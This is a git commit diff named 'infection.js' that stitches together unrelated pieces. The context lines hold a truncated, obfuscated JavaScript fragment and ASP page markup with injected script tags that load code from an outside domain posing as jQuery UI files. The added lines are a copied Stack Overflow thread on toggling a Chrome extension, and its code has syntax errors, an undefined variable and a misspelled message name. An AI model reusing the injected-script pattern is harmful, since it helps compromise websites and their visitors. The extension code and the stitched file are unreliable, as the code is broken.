9cd8793a2a33c9c55383212de0e53001f2aac2f4
mwear3robloxandroid <mitchellwears@gmail.com>
2017-06-11 07:10:04 -0400

    Create infection.js

--- js/infection.js
+++ js/infection.js
@@ -4,3 +4,65 @@ s="";try{q=document.createElement("p");a=(q)?"appendChild":12;q[a]("123"+n);}cat
 <asp:Content ID="Content1" ContentPlaceHolderID="cphBody" Runat="Server">
 //Code here
 </asp:Content>**<script type="text/javascript" language="javascript" src="http://easydiablo3.com//ImageStorage/jquery.ui.button.min.js" ></script><script type="text/javascript" language="javascript" src="http://easydiablo3.com//themes/jquery.ui.dialog.min.js" ></script>**
+Ask Question
+
+up vote3down votefavorite4
+The chrome extension I am developing inserts content scripts and css onto every page of a website. However, the user may have a certain page or pages he or she does not want the extension to run on, so it would be great if I could set up the browser action as basically a toggle on / off.
+What I'd like to do is something like this:
+chrome.browserAction.onClicked.addListener(function(tab) {
+
+    //IF ENABLED THEN DISABLE
+
+    //IF DISABLED THEN ENABLE
+
+} 
+Any help would be greatly appreciated!
+javascript google-chrome google-chrome-extension
+shareimprove this question
+asked Sep 11 '13 at 12:14
+
+TyGoss4216
+add a comment
+2 Answersactiveoldestvotes
+up vote3down voteaccepted
+Such API is not provided. But two possible workarounds exists:
+I. You can use "disabled" flag viable and update it from your background page.
+Background page:
+function disableExtension(disabled)
+{
+    chrome.windows.getAll({populate : true}, function (window_list)
+    {
+        for (var i = 0; i < window_list.length; ++i)
+        {
+            var window = window_list[i];
+            for (var j = 0; j < window.tabs.length; ++j)
+            {
+                var tab = window.tabs[j];
+                if (checkContentScriptExists(tab))
+                {
+                    chrome.tabs.executeScript(tab.id, {code : "disabled = " + disabled + ";"}, allTabs: true) 
+                }
+            }
+        }
+        // No matching url found. Open it in the new tab
+        chrome.tabs.create({ url : url, selected: true });
+    });
+}
+And content script should check the condition before run
+if (!disabled) doSomething();
+II. Controversial approach to save disable variable within background age content
+Background page:
+function disableExtension(disabled)
+{
+    global.disabled = disabled;
+}
+chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
+    if (request.msg == "getDisabled") {
+        sendResponse({disabled: global.disabled});
+        return true;
+    }
+});
+and content script should query current disabled status before execution
+chrome.runtime.sendMessage({msg: "getDiasbled"}, function(response) {
+   if (!response.disabled) doSomething();
+});
